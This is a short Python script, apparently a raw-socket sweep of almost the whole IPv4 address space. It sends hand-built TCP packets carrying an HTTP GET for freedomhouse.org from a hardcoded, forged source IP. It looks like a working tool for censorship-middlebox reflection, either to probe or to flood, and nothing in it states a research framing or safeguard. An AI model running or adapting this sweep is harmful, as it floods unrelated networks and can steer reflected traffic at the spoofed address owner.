import socket
import ipaddress


def packet(src_ip,dst_ip,src_port,dst_port):
    src_port = format(src_port, '04x')
    dst_port = format(dst_port, '04x')

    src_ip = [format(int(i), '02x') for i in src_ip.split(".")]
    src_ip = "".join(src_ip)

    dst_ip = [format(int(i), '02x') for i in dst_ip.split(".")]
    dst_ip = "".join(dst_ip)

    packet = f"450000520001000040062c2f{src_ip}{dst_ip}{src_port}{dst_port}000003e800000bb8501020000ef40000474554202f20485454502f312e310d0a486f73743a2066726565646f6d686f7573652e6f72670d0a0d0a"
    packet = bytes.fromhex(packet)
    return bytes(packet)


if "__main__" == __name__:

    networks = []

    for i in range(244):
        i = i + 1
        networks.append(ipaddress.IPv4Network(f"{i}.0.0.0/8"))


    src_ip = "220.158.232.216"
    src_port = 19999 #端口范围 20000 - 30000
    dst_port = 80
    s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)


    for network in networks:
        print(network)
        for ip in network.hosts():
            src_port += 1
            if src_port == 30001:
                src_port = 20000
            ip = str(ip)
            s.sendto(packet(src_ip,ip,src_port,dst_port),(ip,0))
        
    


